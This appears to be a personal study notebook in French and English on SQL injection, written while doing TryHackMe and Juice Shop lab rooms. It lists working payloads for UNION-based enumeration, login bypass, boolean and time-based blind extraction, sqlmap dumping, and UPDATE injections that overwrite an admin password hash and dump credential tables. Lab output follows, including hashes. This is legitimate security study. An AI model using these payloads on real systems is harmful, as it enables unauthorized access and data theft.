SQL injection

Room Burpsuite repeater :

	Dans l'URL // dans la requête using Burp
	http://10.10.169.81/about/2 -> target
	Dans burp :
	on test avec /about/2' -> l'apostrophe est souvent une bonne solution pour trouver une faille
	dans burp : -> Les 4 null sont pour éviter les erreurs
	/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"

	Dans burp :
	-> pour afficher tous les elements dans 1 seul
	/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"

	Dans burp :
	0 UNION ALL SELECT flag,null,null,null,null FROM people WHERE id = 1


Room Juice shop

Injection SQL via Login
On peut utiliser Burp ou directement écrire dans 'email'

Si on ne connait pas d'adresse mail
	On force le login en tant qu'utilisateur 0
	
	' or 1=1-- à la place de l'adresse mail
	
	' -> est pour fermer la string
	or -> ça ou ça
	1=1 -> toujours vrai
	-- -> pour commenter la suite de la requête

Si on connait une adresse mail
	adresse@mail.com' --
	/!\ le ' doit être collé à la fin sinon -> erreur
	-- toujours pour commenter la suite

La présence ou non de mot de passe n'influe QUE sur le bouton 'continuer' qui peut être désactivé si aucun mot de passe n'est rentré.


SQLi ROOM THM :
	How to look for SQLi :
		- Search for IN-BAND SQLi i.e. we can see the output
		- Search for ERROR-BASED swaping stuff as request parameters to ' or smth
		- Search for a UNION-BASED SQLi as <normal parameter> UNION 1
		
ERROR BASED SQLi
	1st) Look for a proof of concept such as errors displayed on the screen
	2nd) Add parameters after the union as much as needed to avoid error 
		and change the very first param so it return nothing
	3rd) Dump database name by replacing a parameter by database()
	4th) Dump table names by replacing a parameter by :
		group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db_name'
		--group_concat(..)		concat values separated by comas
		--table_name			column in information.schema
		--information_schema		db that is always present contains informations
	5ft) Dump column names of the database by replacing a parameter by :
		group_concat(column_name) FROM information_schema.columns WHERE table_name = 'db_name'
		--column_name 			column that contains database attribute names
	6th) Now that we have the structure, we can request by replacing the same parameter by :
		group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
	
	BLIND-BASED SQLi : Authentication bypass
		1st) Put ' or 1=1; -- in the username form, 
			maybe a password will need to be typed just to pass the form presets
		The first ' close the string, the or 1=1 return True, ';' is used to specify the end
		ans -- to delete following compares
		
BOOLEAN BASED BLIND SQLi
		In this case, we expect a boolean that says if the request is correct or not
		(True/False; 0/1 ; yes/no ; ...)
		On doit donc chercher d'abord un booleen qui nous est retournée si la requête est valide.
		Le principe consiste à requêter des à valider la sortie si le boolean = True
		L'opérateur LIKE '%' est le concept même de cette faille
		
	PROOF OF CONCEPT 
	FIND NUMBER OF ATTRIBUTES 
		admin123' UNION SELECT 1;-- 		return false
		admin123' UNION SELECT 1,3;-- 		return false
		admin123' UNION SELECT 1,2,3;-- 	return true
		(note : admin123 is'nt in the db)
	FIND DATABASE NAME
		admin123' UNION SELECT 1,2,3 where database() like '%';-- 	return true
		admin123' UNION SELECT 1,2,3 where database() like 'a%';--	return false
		admin123' UNION SELECT 1,2,3 where database() like 's%';--	return true so 's' is the first letter
		...
		admin123' UNION SELECT 1,2,3 where database() = 'sqli_three';--	return true so db name is sqli_three
	FIND TABLES NAMES 
		admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
			WHERE table_schema = 'sqli_three' and table_name like '%';-- same process
		(note : it may be more than one table)
	FIND COLUMN NAMES
		admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
			WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%'; --same process
		(note : it may be more than one column)
	FIND ATTRIBUTE VALUES
		admin123' UNION SELECT 1,2,3 from users where username like 'a%
	
TIME BASED SQLi (this is when nothing show the request being wrong or right so if the request come back after a given time, it worked)
	
	1st) Try
	admin123' UNION SELECT SLEEP(5);-- 		Since this not worked
	2nd) Add attributs
	admin123' UNION SELECT SLEEP(5),2;--		until it works
	3rd) Start the boolean based process 
	
		
	
TOOLS :
sqlmap
need to capture a request with burp and put it in request.txt
sqlmap -r request.txt --dbms-mysql --dump


IDENTIFY VERSIONS :
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='

MASTER DATABASE
# MySQL and MSSQL
information_schema.tables 	table_schema		table_name
# For Oracle
?
# For SQLite
sqlite_master						tbl_name	sql


nickName=',nickName=(SELECT GROUP_CONCAT(*) FROM sqlite_master),email='&email=email&password='
nickName=',nickName=SELECT * FROM sqlite_master,email='&email=email&password=
nickName=',nickName=sqlite_version(),email='&email=email&password=

DUMP TABLE NAMES
nickName=',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master),email='&email=email&password=

DUMP COLUMN NAMES
nickName=',nickName=(SELECT group_concat(sql) FROM sqlite_master WHERE name='usertable'),email='&email=email&password=

DUMP DATA
nickName=',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") FROM usertable),email='&email=email&password=
DUMP DATA2
nickName=',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") FROM secrets),email='&email=email&password=



nickName=Admin&email=&password=5dfac5ccc654a3474438474b85a4cfcc21c5239af327dffa02a0a27fbc7ca2a4' WHERE name='Admin';-- -

nickName=Admin', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -

SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable

6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25
5dfac5ccc654a3474438474b85a4cfcc21c5239af327dffa02a0a27fbc7ca2a4
 	10
Salary 	R250
Passport Number 	8605255014084
Nick Name 	CREATE TABLE `usertable` ( 
`UID` integer primary key, 
`name` varchar(30) NOT NULL, 
`profileID` varchar(20) DEFAULT NULL, 
`salary` int(9) DEFAULT NULL, 
`passportNr` varchar(20) DEFAULT NULL, 
`email` varchar(300) DEFAULT NULL, 
`nickName` varchar(300) DEFAULT NULL, 
`password` varchar(300) DEFAULT NULL )



